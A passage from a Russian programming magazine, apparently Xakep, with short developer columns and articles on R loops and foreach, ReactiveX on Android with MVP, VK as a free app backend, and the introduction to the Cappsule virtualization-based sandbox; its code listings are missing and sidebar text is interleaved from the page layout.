никогда не повредит, будь уверен.

АНДРЕЙ ПАХОМОВ
Подметил для себя «новые» веяния в material design. Сначала был «бургер» —
когда меню скрывается за иконкой в левом верхнем углу, похожей на фаст-
фуд-продукт. Теперь Google предлагает разработчикам использовать bottom
navigation: расположить элементы меню в один ряд
   внизу экрана так, чтобы они были всегда перед глазами у пользователя.
По-моему, мы это уже когда-то видели. Ждем top navigation?

ВЛАДИМИР ТИМОФЕЕВ
Недавно прошла новость про перехват ввода данных из андроид-приложений.
В уязвимости используется сервис спецвозможностей, поскольку он может,
например, читать поля ввода EditText. Эту особенность я уже раскрывал в сво-
ей старой статье. Если тебя беспокоит безопасность ввода, рекомендую по-
следовать советам из статьи.
  Еще недавно провел небольшое исследование своего проекта «Wi-Fi на-
поминатель паролей» — возможно ли уменьшить APK-файл и снизить количе-
ство методов. Получилось ужать его с трех до двух мегабайт, попутно удалив
из него фрагменты. Вот тут описано, как сделать ViewPager на простых клас-
сах View. У меня он применяется в двух местах: в основном активити и в обуча-
ющем.
  Во время своих ковыряний я узнал особенности работы некоторых подклю-
чаемых библиотек — главное, как они сами подтягивают лишние зависимости.
От этого число методов в приложении увеличивается, а манифест наполняет-
ся совсем ненужными разрешениями.
  В Gradle мы можем прописать вручную, какие разрешения убрать из итого-
вого манифеста и какие библиотеки отключить принудительно.
   После всех оптимизаций, как всегда, желательно хорошенько проверить
работоспособность :).

АРТУР ГЛЫЗИН
А я расскажу про Servless-приложение на базе Firebase. Если тебя периоди-
чески посещают идеи написать очередное крутое приложение, но ты останав-
ливаешься на этапе написания бэкенда под него, то самое время тебе узнать,
что в современном мире мобильной разработки можно обойтись и без соб-
ственного сервера. Облачных платформ много, но я рекомендую взглянуть
на Firebase, которым с недавнего времени владеет Google.
   Хочешь, чтобы пользователи твоего приложения обменивались файла-
ми? Firebase Storage! Нужно внутри приложения организовать чатик или функ-
цию бэкапа? Firebase Database! Нужна авторизация в приложении? Firebase
Authentication! С Firebase Notifications тебе даже не нужен сервер для рассылки
уведомлений! Check this out.

ЮРИЙ «YUREMBO» ЯЗЕВ
За последнее время yurembo примкнул к разработке двух indie-игр. А что?
Инди — это романтика, кодинг, арт, смелые идеи, выходящие за рамки продю-
серов больших компаний, иногда еда и прочие радости жизни :).
  Первый проект разрабатывается длительное время на пресловутом движ-
ке Cryengine 3.8. Эту версию уже не поддерживает сама Crytek. Поэтому мы
решили перенести имеющиеся наработки на Lumberyard. Причина в том,
что Amazon основала Lumberyard на версии 3.8 «плачущего движка». Следова-
тельно, это должно облегчить перенос.
  Еще до того, как я присоединился, было решено не переходить на Cryengine
5, поскольку в нем отсутствуют коды для редактора движка World Editor. Дело
в том, что в имеющуюся версию (3.8) уже внесено много важных модификаций,
которые необходимо сохранить при переходе. А в Lumberyard есть основа-
тельная поддержка облака и при необходимости автоматически расширяюща-
яся облачная инфраструктура, которая поможет не беспокоиться о наращива-
нии ресурсов при увеличении нагрузки.
   Вторая игра представляет собой двумерную онлайновую аркаду. Игра раз-
рабатывается на голом энтузиазме, вроде Game Jam. В качестве движка бу-
дем юзать мною горячо любимый Torque 2D. Выбор на него пал во многом
благодаря тому, что у него есть мощная сетевая подсистема, о чем я неодно-
кратно говорил.
КОДИНГ
РАЗРАБОТКА
НА R: ТАЙНЫ
ЦИКЛОВ
ВЫЖИМАЕМ МАКСИМУМ ПРОИЗ-
ВОДИТЕЛЬНОСТИ ПРИ ОБРАБОТКЕ
БОЛЬШИХ ОБЪЕМОВ ДАННЫХ





Во многих языках программирования
циклы служат базовыми строитель-
ными блоками, которые используются
для любых повторяющихся задач. Од-          Станислав Чистяков                                                                                            stas.chistyakov@hotmail.com,
нако в R чрезмерное или неправиль-         эксперти машинномупо облачнымобучениютехнологиям
ное использование циклов может
привести к ощутимому падению производительности —
при том, что способов написания циклов в этом языке не-
обычайно много.


Сегодня рассмотрим особенности применения штатных циклов в R, а также
познакомимся с функцией foreach из одноименного пакета, которая пред-
лагает альтернативный подход в этой, казалось бы, базовой задаче. С одной
стороны, foreach объединяет лучшее из штатной функциональности, с дру-
гой — позволяет с легкостью перейти от последовательных вычислений к па-
раллельным с минимальными изменениями в коде.

О циклах
Начнем с того, что часто оказывается неприятным сюрпризом для тех, кто пе-
реходит на R с классических языков программирования: если мы хотим напи-
сать цикл, то стоит перед этим на секунду задуматься. Дело в том, что в языках
для работы с большим объемом данных циклы, как правило, уступают по эф-
фективности специализированным функциям запросов, фильтрации, агрега-
ции и трансформации данных. Это легко запомнить на примере баз данных,
где большинство операций производится с помощью языка запросов SQL,
а не с помощью циклов.
   Чтобы понять, насколько важно это правило, давай обратимся к цифрам.
Допустим, у нас есть очень простая таблица из двух столбцов a и b. Первый
растет от 1 до 100 000, второй уменьшается со 100 000 до 1:


Если мы хотим посчитать третий столбец, который будет суммой первых двух,
то ты удивишься, как много начинающих R-разработчиков могут написать код
такого вида:



На моем ноутбуке расчеты занимают 39 секунд, хотя того же результата можно
достичь за 0,009 секунды, воспользовавшись функцией для работы с таблица-
ми из пакета dplyr:


Основная причина такой серьезной разницы в скорости заключается в потере
времени при чтении и записи ячеек в таблице. Именно благодаря оптимиза-
циям на этих этапах и выигрывают специальные функции. Но не надо списы-
вать в утиль старые добрые циклы, ведь без них все еще невозможно создать
полноценную программу. Давай посмотрим, что там с циклами в R.

КЛАССИЧЕСКИЕ ЦИКЛЫ
R поддерживает основные классические способы написания циклов:
•  for — самый распространенный тип циклов. Синтаксис очень прост и зна-
   ком разработчикам на различных языках программирования. Мы уже про-
   бовали им воспользоваться в самом начале статьи. for выполняет пере-
   данную ему функцию для каждого элемента.





•  Чуть менее распространенные while и repeat, которые тоже часто встреча-
   ются в других языках программирования. В while перед каждой итерацией
   проверяется логическое условие, и если оно соблюдается, то выполняется
   итерация цикла, если нет — цикл завершается:


  В repeat цикл повторяется до тех пор, пока в явном виде не будет вызван
   оператор break:


   Стоить отметить, что for, while и repeat всегда возвращают NULL, —
   и в этом их отличие от следующей группы циклов.

Циклы на основе apply
apply, eapply, lapply, mapply, rapply, sapply, tapply, vapply — достаточ-
но большой список функций-циклов, объединенных одной идеей. Отличаются
они тем, к чему цикл применяется и что возвращает. Начнем с базового apply,
который применяется к матрицам:


В первом параметре (X) указываем исходную матрицу, во втором параметре
(MARGIN) уточняем способ обхода матрицы (1 — по строкам, 2 — по столбцам,
с(1,2) — по строкам и столбцам), третьим параметром указываем функцию
FUN, которая будет вызвана для каждого элемента. Результаты всех вызовов
будут объединены в один вектор или матрицу, которую функция apply и вер-
нет в качестве результирующего значения.
   Например, создадим матрицу m размером 3 х 3.





Попробуем функцию apply в действии.





Для простоты я передал в apply существующую функцию sum, но ты можешь
использовать свои функции — собственно, поэтому apply и является полно-
ценной реализацией цикла. Например, заменим сумму нашей функцией, кото-
рая сначала производит суммирование и, если сумма равна 15, заменяет воз-
вращаемое значение на 100.





Другая распространенная функция из этого семейства — lapply.


Первым параметром передается список или вектор, а вторым — функция, ко-
торую надо вызвать для каждого элемента. Функции sapply и vapply — это
обертки вокруг lapply. Первая пытается привести результат к вектору, матри-
це или массиву. Вторая добавляет проверку типов возвращаемого значения.
   Достаточно распространен такой способ применения sapply, как работа
с колонками. Например, у нас есть таблица



При передаче sapply таблицы она будет рассматриваться как список колонок
(векторов). Поэтому, применив sapply к нашему data.frame и указав в каче-
стве вызываемой функции is.numeric, мы проверим, какие столбцы являются
числовыми.




Выведем на экран только столбцы с числовыми значениями:




Циклы, основанные на apply, отличаются от классических тем, что возвраща-
ется результат работы цикла, состоящий из результатов каждой итерации.
  Помнишь тот медленный цикл, что мы написали в самом начале с помощью
for? Большая часть времени терялась на то, что на каждой итерации в табли-
цу записывались результаты. Напишем оптимизированную версию с исполь-
зованием apply.
  Применим apply к первоначальной таблице, выбрав обработку по строч-
кам, и в качестве применяемой функции укажем базовую суммирующую функ-
цию sum. В итоге apply вернет вектор, где для каждой строки будет указана
сумма ее колонок. Добавим этот вектор в качестве нового столбца первона-
чальной таблице и получим искомый результат:



Замер времени исполнения показывает 0,248 секунды, что в сто раз быстрее
первого варианта, но все еще в десять раз медленнее функций операций с та-
блицами.

foreach
foreach — не базовая для языка R функция. Соответствующий пакет необхо-
димо установить, а перед вызовом подключить:



Несмотря на то что foreach — сторонняя функция, на сегодняшний день это
очень популярный подход к написанию циклов. foreach был разработан од-
ной из самых уважаемых в мире R компанией — Revolution Analytics, создав-
шей свой коммерческий дистрибутив R. В 2015 году компания была куплена
Microsoft, и сейчас все ее наработки входят в состав Microsoft SQL Server R
Services. Впрочем, foreach представляет собой обычный open source проект
под лицензией Apache License 2.0.
  Основные причины популярности foreach:
•  синтаксис похож на for — как я уже говорил, самый популярный вид циклов;
•  foreach возвращает значения, которые собираются из результатов каждой
   итерации, при этом можно определить свою функцию и реализовать любую
   логику сбора финального значения цикла из результатов итераций;
•  есть возможность использовать многопоточность и запускать итерации па-
   раллельно.

Начнем c простого. Для чисел от 1 до 10 на каждой итерации число умножа-
ется на 2. Результаты всех итераций записываются в переменную result в виде
списка:



Если мы хотим, чтобы результатом был не список, а вектор, то необходимо
указать c в качестве функции для объединения результатов:



Можно даже просто сложить все результаты, объединив их с помощью опера-
тора +, и тогда в переменную result будет просто записано число 110:



При этом в foreach можно указывать одновременно несколько переменных
для обхода. Пусть переменная a растет от 1 до 10, а b уменьшается от 10 до 1.
Тогда мы получим в result вектор из 10 чисел 11:



Итерации циклов могут возвращать не только простые значения. Допустим,
у нас есть функция, которая возвращает data.frame:





Если мы хотим вызвать эту функцию сто раз и объединить результаты в один
data.frame, то в .combine для объединения можно использовать функцию
rbind:





В результате в переменной result у нас собрана единая таблица результатов.
  В .combine возможно также использовать свою собственную функцию,
причем с помощью дополнительных параметров можно оптимизировать про-
изводительность, если твоя функция умеет принимать больше чем два параме-
тра сразу (в документации foreach есть описание параметров .multicombine
и .maxcombine).
  Одно из главных преимуществ foreach заключается в легкости перехода
от последовательной обработки к параллельной. Фактически этот переход
осуществляется заменой %do% на %dopar%, но при этом есть несколько нюан-
сов:
1. До вызова foreach у тебя уже должен быть зарегистрирован parallel backend.
  В R есть несколько популярных реализаций parallel backend doParallel,
   doSNOW, doMC, и у каждого есть свои особенности, но предлагаю ради про-
   стоты выбрать первый и написать несколько строчек кода для его подклю-
   чения:





   Если сейчас вызвать цикл из восьми итераций, каждая из которых просто
   ждет одну секунду, то будет видно, что цикл отработает за одну секунду, так
   как все итерации будут запущены параллельно:





   После использования parallel backend можно остановить:


   Нет никакой необходимости каждый раз перед foreach создавать, а затем
   удалять parallel backend. Как правило, он создается один раз в программе
   и используется всеми функциями, которые могут с ним работать.
2. Тебе надо явно указать, какие пакеты необходимо загрузить в рабочие по-
   токи с помощью параметра .packages.

Например, ты хочешь на каждой итерации создавать файл с помощью пакета
readr, который загрузили в память перед вызовом foreach. В случае после-
довательного цикла (%do%) все отработает без ошибок:




При переходе на параллельную обработку (%dopar%) цикл закончится с ошиб-
кой:

Error in write_csv(data.frame(id = 1), paste0("file", i, ".csv")) :
task 1 failed - "could not find function "write_csv""

  Ошибка возникает, поскольку внутри параллельного потока не загружен
пакет readr. Исправим эту ошибку с помощью параметра .packages:



3. Вывод на консоль в параллельном потоке не отображается на экране. Ино-
   гда это может здорово усложнить отладку, поэтому обычно сложный код
   сначала пишут без параллельности, а потом заменяют %do% на %dopar% либо
   перенаправляют вывод каждой итерации в свой файл с помощью функции
   sink.

Вместо выводов
•  При работе с большим объемом данных циклы не всегда
   оказываются лучшим выбором. Использование специали-
   зированных функций для выборки, агрегации и трансфор-
  мации данных всегда эффективнее циклов.
• R предлагает множество вариантов реализации циклов.
   Основное отличие классических for, while и repeat    WWW
   от группы функций на основе apply заключается в том,
                                                                         Официальная   что последние возвращают значение.                                                                            документация па-
•  Использование циклов foreach из одноименного внеш-     кета foreach (pdf)
   него пакета позволяет упростить написание циклов, гиб-
                                                                       Официальный   ко оперировать возвращаемыми итерациями значения-
                                                                            обзор функцио-
   ми, а за счет подключения многопоточной обработки еще                                                                              нальности foreach
   и здорово увеличить производительность решения.                      (pdf)
 КОДИНГ

РЕАКТИВНАЯРЕАКТИВНАЯ
РАЗРАБОТКАРАЗРАБОТКА
  ANDROIDANDROIDВВ            ФРЕЙМВОРК,  REACTIVEX:                ООП         ПОДРУЖИЛ  КОТОРЫЙ
  И ФУНКЦИОНАЛЬНОЕ
  ПРОГРАММИРОВАНИЕ





                    Пахомов              Андрей
               mailforpahomov@gmail.com



 Мир ООП-разработки вообще и язык Java в частности жи-
 вут очень активной жизнью. Тут есть свои модные тенден-
 ции, и сегодня разберем один из главных трендов сезо-
 на — фреймворк ReactiveX. Если ты еще в стороне от этой
 волны — обещаю, она тебе понравится! Это точно лучше,
 чем джинсы с завышенной талией :).

 РЕАКТИВНОЕ ПРОГРАММИРОВАНИЕ
 Как только ООП-языки доросли до массового применения, разработчики
 осознали, насколько иногда не хватает возможностей С-подобных языков. По-
 скольку написание кода в стиле функционального программирования серьез-
 но разрушает качество ООП-кода, а значит, и поддерживаемость проекта, был
 придуман гибрид — реактивное программирование.
   Парадигма реактивной разработки строится на идее постоянного отсле-
 живания изменений состояния объекта. Если такие изменения произошли,
 то все заинтересованные объекты должны получить уже обновленные данные
 и работать только с ними, забыв про старые.
   Хорошим примером идеи реактивного программирования может служить
 Excel-таблица. Если связать несколько ячеек одной формулой, результат вы-
 числения будет меняться каждый раз, когда изменятся данные в этих ячейках.
 Для бухгалтерии такое динамическое изменение данных — привычное дело,
 но для программистов это скорее исключение.

 a = 3;
 b = 4;
 c = a + b;
 F1(c);
 a = 1;
 F2(c);

 В этом примере функции F1 и F2 будут работать с разными значениями пе-
 ременной C. Часто требуется, чтобы у обеих функций были только самые ак-
 туальные данные, — реактивное программирование позволит без измене-
 ния логики самих функций сразу же вызвать F1 с новыми параметрами. Такое
 построение кода дает приложению возможность моментально реагировать
 на любые изменения, что сделает его быстрым, гибким и отзывчивым.

 REACTIVEX
 Воплощать с нуля идеи реактивного программирования может быть довольно
 хлопотно — есть подводные камни, да и времени это займет прилично. Поэто-
 му для многих разработчиков эта парадигма оставалась только теоретическим
 материалом, пока не появился ReactiveX.
   Фреймворк ReactiveX — это инструмент для реактивного программирова-
 ния, работающий со всеми популярными ООП-языками. Сами создатели на-
 зывают его мультиплатформенным API для асинхронной разработки, основан-
 ным на паттерне «Наблюдатель» (Observer).
    Если термин «реактивное программирование» — это своего рода теорети-
 ческая модель, то паттерн «Наблюдатель» — готовый механизм отслеживания
 изменений в программе. А отслеживать их приходится довольно часто: загруз-
 ку и обновление данных, оповещения о событиях и так далее.





                             Рис. 1. Паттерн «Наблюдатель»


 Паттерн «Наблюдатель» существует примерно столько же, сколько и само
 ООП. Объект, состояние которого может поменяться, называется издателем
 (популярный перевод термина Observable). Все остальные участники, которым
 интересны эти изменения, — подписчики (Observer, Subscriber). Для получе-
 ния уведомлений подписчики регистрируются у издателя, явно указывая свой
 идентификатор. Издатель время от времени генерирует уведомления, кото-
 рые им же рассылаются по списку зарегистрированных подписчиков.
    Собственно, создатели ReactiveX не придумали ничего революционно-
 го, они просто удобно реализовали паттерн. И хотя во многих ООП-языках,
 и в Java в частности, есть готовые реализации паттерна, в этом фреймворке
 присутствует дополнительный «тюнинг», который превращает «Наблюдатель»
 в очень мощный инструмент.

 RXANDROID
 Порт библиотеки ReactiveX для мира Android называется rxAndroid и подключа-
 ется, как всегда, через Gradle.


 Издатель, генерирующий уведомления, здесь задается с помощью класса
 Observable. У издателя может быть несколько подписчиков, для их реализации
 воспользуемся классом Subscriber. Стандартное поведение для Observable —
 выпустить одно или несколько сообщений для подписчиков, а затем завер-
 шить свою работу или выдать сообщение об ошибке. В качестве сообщений
 могут быть как переменные, так и целые объекты.





 В данном случае издатель myObserv сначала отправит строки hello и message,
 а затем сообщение об успешном завершении работы. Издатель может вы-
 звать методы onNext(), onCompleted() и onEror(), поэтому у подписчиков
 они должны быть определены.





 Все готово для работы. Осталось связать объекты между собой — и «Hello,
 world!» в реактивном программировании готов!


 Надо сказать, что это был очень простой пример. В ReactiveX есть множество
 вариантов поведения всех участников паттерна: фильтрация, группирование,
 обработка ошибок. Пользу от реактивного программирования можно ощутить,
 только попробовав его в деле. Приступим к задаче посерьезнее.

 MVP
 Академические примеры работы ReactiveX ты найдешь на официальном сайте
 фреймворка, а в этой статье мы с тобой разберем более приземленный пример.
    Как показывает практика, создавая что-то сложнее студенческого курсо-
 вика, следует строить приложение с использованием еще одного паттерна —
 MVP (Model, View, Presenter). Он позволяет разбить ООП-проект на отдель-
 ные, слабо связанные и легко заменяемые логические блоки кода.
    Как правило, каждый из блоков в MVP имеет свое предназначение — это
 помогает использовать паттерн с полной эффективностью.
 •  Model — поставщик данных в приложении. Внутри него аккумулируется вся
    механика запросов: сетевое взаимодействие, работа с файлами и прочее.
 •  View отвечает за UI и все, что рядом. В этом блоке генерируются запросы
    на выдачу необходимых данных и, при желании, ведется их финальная обра-
    ботка: сортировка, выборка отдельных значений и так далее.
 •  Presenter действует как посредник. Поскольку View и Model мало что знают
    друг и о друге, этот блок служит своего рода «переходником», перенаправ-
    ляя запросы от одного к другому.





                                   Рис. 2. Паттерн MVP

 ООП-код обязательно нужно стараться делать поддерживаемым, иначе про-
 грамме сложно будет дожить хотя бы до версии 1.1. Разработчику часто при-
 ходится вносить изменения уже во время рабочего процесса: добавлять ке-
 ширование, изменять дизайн, делать новое меню и так далее. Следование
 принципам MVP помогает изменять логику приложения практически без боли
 и потери времени.
   При этом редкое приложение обходится без длительных вычислений,
 а значит, разработчику придется еще и как-то управляться с дополнительными
 потоками. Наш журнал уже не раз затрагивал эту тему, и ты должен быть в кур-
 се возможных проблем: взаимные блокировки, перерасход памяти, потеря
 результатов... ReactiveX позволяет не только легко внедрить паттерн «Наблю-
 датель», но и раскидать вычисления по разным потокам, причем реализацию
 многопоточности он берет на себя.
   Для демонстрации сказанного создадим небольшой проект, в котором код
 построен в соответствии с паттерном MVP, а все тяжелые вычисления деле-
 гированы фреймворку. Начнем с блока Model. При использовании MVP нужно
 стремиться передавать как можно меньше данных между логическими блоками.
 Достаточно ограничиться, к примеру, ссылкой на ресурс для доступа к данным.
    Источников, генерирующих данные, наверняка окажется несколько, поэто-
 му внутри Model будет объект класса HeavyOperation.





 Как понятно из названия, HeavyOperation будет работать очень  долго,
 а в Android длительные операции нужно всегда выполнять в отдельном потоке.





 Кстати, некоторые библиотеки самостоятельно решают такие проблемы:
 к примеру, при загрузке файла с помощью Retrofit не надо что-то придумывать,
 она сама загрузит файл в новом потоке. А когда нужно будет работать с фай-
 ловой системой или базой данных, поможет ReactiveX.
    Используем фреймворк, чтобы выполнить все эти вычисления где-нибудь
 в фоне, а результат вернуть обратно — в главный поток. Издатель выполнит
 у себя метод prepareList, а результат, объект класса UserList, уйдет подпис-
 чикам.





 Многопоточность в ReactiveX создается просто: указываем, что вычисления
 нужно выполнять в отдельном потоке (subscribeOn), а результат вернуть в глав-
 ный поток (observeOn).



 Блок Model должен не только создать объект на основе класса HeavyOperation,
 но и реализовать get-метод, дающий доступ к нему извне.



 Теперь перейдем к Presenter, связующему блоку. Здесь необходимо сохранить
 ссылки на блоки Model и View, а также связать их между собой get-методами.





 Генерация данных будет происходить только по команде от View, для этого
 создан метод loadDatawithRx. Вполне возможно, действий будет больше, чем
 просто генерация списка. К примеру, имеет смысл сразу запустить на экране
 анимацию загрузки данных.



 В Presenter нужно прошить из Model ссылку на объект издателя, для этих целей
 и были созданы get-методы.


 Издатель уже есть, осталось сгенерировать подписчика. Создадим его тут же,
 используя метод subscribe и класс Observer.





 И вот сила ReactiveX в действии — нам удалось связать паттерном «Наблю-
 датель» блоки Model и View. Метод doTheJob сгенерирует новый поток, соз-
 даст в нем список, а потом данные сразу же попадут во View через метод
 showResult. При этом приложение продолжает жить активной жизнью, без за-
 держек и перерасхода памяти.
    Кстати, мы еще совсем ничего не знаем о блоке View. По сути, код тут мо-
 жет быть совершенно произвольным, никак не завязанным на реактивном про-
 граммировании. Все, что от View требуется, — реализовать методы inProgress
 и showResult, вызываемые из связующего блока.





 Чтобы паттерн заработал, осталось только инициализировать объекты на ос-
 нове созданных классов — сделать это можно где-нибудь в MainActivity.




 Созданной программе не страшны (в пределах разумного) ни масштабиро-
 вание, ни расширение функциональности. Задачи, ради которых раньше при-
 шлось бы долго-долго править код и вставлять костыли, теперь решаются на-
 много проще и изящнее с помощью реактивного программирования.





                                                  Рис. 3. Многообразие портов ReactiveX

 ЛЯМБДА-ВЫРАЖЕНИЯ
 При работе с ReactiveX каждый раз приходится создавать новые объекты и тут
 же переопределять какие-то методы. В результате возникает нагромождение
 малоиспользуемых объектов и такой код плохо читается.
   В Java 8 появились так называемые лямбда-выражения, которые очень
 похожи на функции в С-подобных языках. Не так давно они стали доступны
 и в Android (с обратной совместимостью API до версии 23), теперь можно сде-
 лать код более читаемым и лаконичным.





 REACTIVEX V.2
 Этот фреймворк очень популярен и активно развивается.
 Совсем недавно вышла его новая версия, разработчики
 добавили новые возможности. К примеру, если требуется
 создать издателя, генерирующего не более одного сооб-
 щения подписчикам, удобней пользоваться новым клас-
                                                          INFO сом Maybe. В целом отличия выплывают уже после актив-
 ного использования фреймворка.                                                                          Исходный код
                                                                         примера (zip)
 OUTRO
                                                                         Вся информация ReactiveX может выручить в ситуациях, которые раньше                                                                            о фреймворке
 казались практически нерешаемыми. Попробуй написать
 что-нибудь самостоятельно, и ты поймешь, насколько это      Живая классика
                                                                             о паттернах мощный инструмент. Как обычно, на нашем сайте будет
 весь исходный код созданного сегодня приложения. Если                                                                       Подробнее о лямбда
 останутся вопросы, пиши мне на почту, разберемся вме-          в Android
 сте. Удачи!
КОДИНГ


VK.COM
КАК БЭКЕНД:
ПОДВОДНЫЕ КАМНИ
РЕШАЕМ ПРОБЛЕМЫ
ПО ЗАЯВКАМ ЧИТАТЕЛЕЙ



В прошлых статьях (раз и два) была описана
разработка мобильного приложения со все-
ми любимым VK в роли бесплатного и ус-
                                                                        Владимир Петровичлужливого сервера. Как это часто случается                                                                             Тимофеев
со всякими хитровыкрученными системами,            rusdelphi.com
рано или поздно они обрастают мелкими,
но досадными проблемами, затрудняющими их использо-
вание. И как только это случается, журнал «Хакер» снова
приходит на помощь :).

ВЕРСИЯ VK API
При вызове какого-либо мето-
да нужно специально указывать
версию API в параметре v — на-
пример,  последнюю  v=5.53.
Иначе по умолчанию он отве-
тит тебе  версией, созданной
еще при Дурове, а именно 3.0.
Ее поддержку оставляют из-за
очень старых программ, напи-
санных давно, но работающих
по сей день. Проблема с вер-
сией  заключается  в  разных
JSON-ответах сервера. Чтобы
не встретиться с новой струк-
турой при работе с методом
wall.get, принудительно  ука-
зывай версию и еще на вся-
кий пожарный — число записей
(count). Так API будет вести себя
более предсказуемо.
                                                 Не забудь про версию API
ХРАНЕНИЕ ЗАПИСЕЙ
СО СТЕНЫ
Чтобы получить все записи со стены группы и иметь возможность обновлять
данные, проще всего каждый раз выкачивать все записи со стены последова-
тельно. Метод wall.get отдает данные с конца стены; используя смещение
(offset), можно добраться до другого конца. Полное количество записей из-
вестно из переменной count ответа.
   Каждую запись проще хранить в классе. Вот пример:





Он реализует два интерфейса: Serializable и Comparable. Первый использу-
ется для возможности сохранения всей его структуры целиком как строки
в SharedPreferences, а второй — для упорядочивания списка по id . Его реали-
зация:





Для обновления записей я каждый раз удаляю старую запись из списка
(List<ProductStore>) и добавляю новую:



Так у нас появляется возможность увидеть обновление в записи. Правда, VK
дает редактировать новые записи примерно сутки. Позже редактирование от-
ключается и обновление становится недоступно, можно только публиковать
заново.
   Когда нужно поработать со всем массивом, я запускаю сортировку:



ЗАГРУЗКА КАРТИНОК
Для загрузки картинок могут использоваться разные библиотеки: Fresco,
Picasso, Universal Image Loader. Я использую Glide, поскольку он поддержива-
ет GIF. Кому-то важна стабильность работы библиотеки, кому-то размер (в том
числе количество методов). Я в работе столкнулся со странным поведением
Glide при загрузке большого количества картинок в списках: картинки загружа-
лись хаотично, а некоторые вообще не отображались.
   Поймать ошибку помог слушатель ответов загрузки. Устанавливается
он так:





В лог тут же свалилось

Exception java.net.SocketTimeoutException: timeout

Диагноз ясен: мобильная сеть плохо получает данные с VK с помощью стан-
дартного компонента работы с сетью.
   Выход был в использовании компонента okhttp3. Для его использования
нужно просто прописать его в Gradle:



Glide сам его подхватит при компиляции и будет использовать. Так стали за-
гружаться все картинки, даже на самой плохой мобильной сети.

ПРОДВИНУТАЯ РАБОТА
С GLIDE
Эта библиотека поддерживает загрузку эскизов изображений. Например, мы
можем получить миниатюру GIF-файла и показать ее пользователю, пока за-
гружается основной файл. Нам только нужно знать URL для загрузки картинки.
VK API имеет для этого свойство thumb у объекта doc. Добавить в объект за-
писи новое поле, думаю, не составит особого труда, так как он был подроб-
но описан в предыдущих статьях. Теперь нам нужно сделать предзапрос и его
результат передать в основную загрузку. Glide сам заменит эскиз на основной
документ после его загрузки.





Можно  пойти  еще  дальше
и сделать отображение загруз-
ки основной  картинки прямо
поверх эскиза. Такие трюки до-
ступны не всем, но настоящий
хакер сможет разобраться с за-
дачей, тем более что ее в об-
щих чертах уже решил созда-
тель библиотеки.
  По рекомендации Балбеса
из известного фильма, для те-
стов с загрузкой я использую
кошек.

ПОЛУЧЕНИЕ АВАТАРА
ПОЛЬЗОВАТЕЛЯ
При использовании vk-android-
sdk  первым  делом  проверя-
ем, залогинился ли пользова-
тель   VKSdk.isLoggedIn.  Если
да, то нужно запустить метод
VKApi.users().get() с допол-
нительными полями photo_50,
photo_100,   photo_200. Если
он не вернет нам в поле за-
глушку вроде -http://vk.com/
images/camera_a.gif  , то мы
получим от него аватар в разре-
шении 50 х 50,100 х 100 или 200
х 200. Зависит это от самого
аватара пользователя, раньше                 Тренироваться лучше на кошках
можно было загрузить и совсем
маленькую картинку.
   Вот метод, устанавливающий фото и имя пользователя в ImageView
и TextView соответственно:





ЕЩЕ НЕ КОНЕЦ!
Вместо заключения хочу отметить, что бесплатный VK-бэкенд хорош в исполь-
зовании, но несет с собой много трудностей. С нашим журналом ты узнаешь
о большинстве из них и всегда будешь готов к праведной борьбе за торжество
программерской мысли :).
UNIXOID





                      ИЗУЧАЕМ
                        CAPPSULE,
                     СИСТЕМУ
                    ИЗОЛЯЦИИ
                    ПРИЛОЖЕНИЙ
                      НА БАЗЕ
                      ТЕХНОЛОГИЙ
                      ВИРТУАЛИЗАЦИИДОБРО
ПОЖАЛОВАТЬ
В МАТРИЦУ


Казалось бы, мы рассказали о песочницах уже
всё. И про Docker написали во всех подроб-
ностях, и обзор инструментов для «быстрой»
изоляции приложении сделали, даже собрали      Евгенийzobnin@gmail.comЗобнин
песочницу собственными руками. Но, как вы-
яснилось, нет предела человеческой изобретательно-
сти. Встречай Cappsule — систему изоляции приложений
на базе полноценной виртуализации. Надежная, как IBM
ThinkPad, удобная, как iPhone, эффективная, как Core i7.


В основе работы почти всех применяемых сегодня песочниц для изоляции при-
ложений, будь то песочницы Firejail, песочницы iOS, Android или даже системы
Docker, лежит один простой принцип: запереть приложение в его каталоге и от-
резать ему доступ к информации об остальной части системы и ее API. Как это
реализуется — с помощью chroot, пространств имен и seccomp-bpf, как в боль-
шинстве песочниц Linux, или с помощью запуска каждого приложения с пра-
вами созданного специально для него юзера и своей собственной системы
ограничения прав, как в Android, — неважно. А важно то, что в каждом из этих
случаев за изоляцию приложений отвечает ядро ОС, общее для всех них.
   Благодаря использованию встроенных в ядро механизмов изоляции такие
песочницы очень дешевы в создании и обслуживании, они не приводят к су-
щественному увеличению расхода оперативной памяти, не съедают место
на диске и вообще отличаются высокой эффективностью. Однако платить,
как известно, приходится за все, и в данном случае расплата бьет по тому са-
мому месту, которое песочницы и призваны охранять, — безопасности основ-
ной системы.
   Запуская софт в песочнице, мы рассчитываем оградить его от других пе-
сочниц и операционной системы, просто для того, чтобы взлом этой софтины
или наличие в ней малвари не привели к компрометации всех остальных дан-
ных. И в большинстве случаев это работает, но ровно до тех пор, пока взлом-
щик не найдет способ из нее выбраться. А способ этот в грамотно спроекти-
рованной песочнице обычно один — уязвимость в ядре ОС. Почти вся малварь
для Android, способная получить права root, и большинство джейлбрейков iOS
эксплуатируют дыры в ядре. А ядро настольного Linux почти ничем не отлича-
ется от ядра того же Android. И дыры в нем находят хоть и чуть реже (благода-
ря меньшему количеству блобов от производителей железа), но регулярно.
   Разработчикам песочниц и операционных систем, запускающих софт в пе-
сочницах, это хорошо известно, как и последствия. Поэтому Apple и Google,
все операционки которых используют идею песочниц, борются с этой угро-
зой при помощи апдейтов: появилась информация о дыре — быстро ее ис-
правляем и выкатываем обновление. У Apple это получается хорошо, у Google
плохо, но в любом случае, если информации о дыре нет, не будет исправле-
ния. И если на твоем смартфоне оно не так уж и важно, то в Linux-системе,
где хранится твой Bitcoin-кошелек и куча другой конфиденциальной информа-
ции, взлом системы через запущенный в песочнице браузер может привести
к очень печальным последствиям.
  Один из способов борьбы с 0day-уязвимостями в ядре — виртуальная ма-
шина, такая как VirtualBox, QEMU или Parallels. Запускаем небезопасное при-
ложение внутри виртуальной машины вместо классической песочницы, и вуа-
ля — взлом самого приложения и возможный взлом ядра никак не затрагивают
основную ОС. В таком подходе уязвимым местом оказывается не ядро, а ги-
первизор и код, эмулирующий различные железные подсистемы: сетевую кар-
ту, USB- и SATA-контроллеры. И если посмотреть на статистику уязвимостей
того же VirtualBox, то становится ясно, что в целом критических уязвимостей
здесь намного меньше, чем, например, в ядре Linux. Но что более интересно:
почти все из них находят именно в коде эмуляции железа.
  И здесь мы подходим к самому интересному вопросу: а можно ли создать
настолько простую виртуальную машину (в идеале вообще без кода эмуляции
железа), чтобы она была практически неуязвима, но тем не менее способна
запускать стандартный пользовательский софт?

